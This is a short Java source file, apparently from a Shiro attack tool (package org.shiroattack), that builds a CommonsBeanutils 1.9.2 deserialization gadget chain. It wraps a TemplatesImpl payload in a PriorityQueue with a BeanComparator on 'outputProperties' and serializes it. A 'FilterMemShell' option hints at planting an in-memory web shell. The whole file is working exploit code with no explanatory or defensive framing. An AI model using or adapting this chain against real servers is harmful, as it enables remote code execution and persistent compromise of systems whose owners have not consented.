package org.shiroattack;

import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
public class CB192 {
    public static byte[] CBWithoutCC(String payload) throws Exception {

        if (payload == "FilterMemShell") {
            payload = "DefineClass";
        }

        Object templates = Gadgets.createTemplatesImpl(payload);

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Gadgets.setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) Gadgets.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
